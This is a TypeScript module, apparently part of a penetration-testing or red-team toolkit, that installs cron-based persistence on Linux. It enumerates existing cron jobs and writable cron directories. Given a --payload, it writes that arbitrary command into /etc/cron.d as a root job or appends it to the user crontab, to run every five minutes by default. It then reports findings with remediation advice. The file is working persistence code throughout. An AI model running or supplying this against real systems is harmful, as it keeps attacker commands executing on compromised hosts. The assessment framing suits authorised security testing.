import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]
  const payload = argVal(args, "--payload")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"

  const script = `
echo "--- Current Cron Jobs ---"
crontab -l 2>/dev/null && echo "[*] User crontab exists" || echo "[-] No user crontab"
echo ""
echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
echo ""
echo "--- Cron Directories ---"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
  if [ -d "$d" ]; then
    count=$(ls -1 "$d" 2>/dev/null | wc -l)
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    echo "$d: $count scripts ($writable)"
  fi
done
echo ""
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo ""
${payload ? `
echo "--- Installing Cron Persistence ---"
if [ -w /etc/cron.d/ ]; then
  echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
elif command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null; echo "${schedule} ${payload}") | crontab - 2>/dev/null && echo "[+] Added to user crontab" || echo "[-] Failed to add to user crontab"
else
  echo "[-] No writable cron location found"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-CRONP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "cron",
      title: "Cron persistence installed",
      details: `Cron job persistence established with schedule: ${schedule}`,
      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
    })
  }

  const writable = (r.stdout.match(/WRITABLE/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-CRONP-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "cron_dirs",
      title: "Writable cron directories found",
      details: `${writable} cron directory/directories are writable — persistence can be established`,
      remediation: "Restrict cron directory permissions to root only (755 with root ownership).",
    })
  }

  return { output: output.join("\n"), findings }
}
